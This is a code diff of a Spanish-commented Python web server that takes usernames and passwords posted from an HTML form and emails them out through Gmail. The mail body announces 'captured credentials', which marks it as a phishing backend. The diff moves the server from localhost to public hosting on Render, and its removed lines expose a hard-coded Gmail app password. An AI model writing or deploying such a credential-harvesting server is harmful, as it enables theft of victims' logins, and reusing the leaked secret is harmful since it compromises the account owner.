@@ -1,18 +1,17 @@
 import json
 import smtplib
+import os
 from email.mime.text import MIMEText
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 # ================= CONFIGURACIÓN DE CORREO =================
-# Si usas Gmail, necesitas generar una "Contraseña de aplicación" 
-# desde la configuración de seguridad de tu cuenta de Google.
-REMITENTE = "dap@sae.cl"
-CONTRASENA_APP = "fsmm jttl omgr bmah" 
-DESTINATARIO = "dap@sae.cl"
+# Las credenciales se leen desde las variables de entorno configuradas en Render
+REMITENTE = os.environ.get('REMITENTE')
+CONTRASENA_APP = os.environ.get('CONTRASENA_APP')
+DESTINATARIO = os.environ.get('DESTINATARIO')
 # ===========================================================
 
 class ServidorLocal(BaseHTTPRequestHandler):
-    # Configuración de CORS para permitir que tu HTML se comunique con Python
     def end_headers(self):
         self.send_header('Access-Control-Allow-Origin', '*')
         self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
@@ -24,7 +23,6 @@ class ServidorLocal(BaseHTTPRequestHandler):
         self.end_headers()
 
     def do_POST(self):
-        # 1. Leer los datos enviados por el HTML
         longitud = int(self.headers['Content-Length'])
         datos_crudos = self.rfile.read(longitud)
         datos = json.loads(datos_crudos.decode('utf-8'))
@@ -32,7 +30,6 @@ class ServidorLocal(BaseHTTPRequestHandler):
         usuario = datos.get('username', '')
         contrasena = datos.get('password', '')
 
-        # 2. Preparar el correo
         cuerpo_mensaje = f"Se han capturado nuevas credenciales:\n\nUsuario: {usuario}\nContraseña: {contrasena}"
         msg = MIMEText(cuerpo_mensaje)
         msg['Subject'] = 'Datos del Formulario Local'
@@ -40,7 +37,6 @@ class ServidorLocal(BaseHTTPRequestHandler):
         msg['To'] = DESTINATARIO
 
         try:
-            # 3. Conectar a Gmail y enviar
             print("Conectando al servidor de correo...")
             servidor_smtp = smtplib.SMTP('smtp.gmail.com', 587)
             servidor_smtp.starttls()
@@ -50,7 +46,6 @@ class ServidorLocal(BaseHTTPRequestHandler):
             
             print(f"¡Correo enviado con éxito! (Usuario: {usuario})")
             
-            # 4. Responder al navegador que todo salió bien
             self.send_response(200)
             self.end_headers()
             self.wfile.write(b"OK")
@@ -61,7 +56,9 @@ class ServidorLocal(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(f"Error: {e}".encode('utf-8'))
 
-# Arrancar el servidor en el puerto 8000
-puerto = 8000
+# Render asigna el puerto dinámicamente en la variable PORT
+puerto = int(os.environ.get('PORT', 8000))
 print(f"Servidor Python escuchando en el puerto {puerto}...")
-HTTPServer(('localhost', puerto), ServidorLocal).serve_forever()
+
+# 0.0.0.0 permite que la aplicación exponga el puerto a las interfaces de red de Render
+HTTPServer(('0.0.0.0', puerto), ServidorLocal).serve_forever()
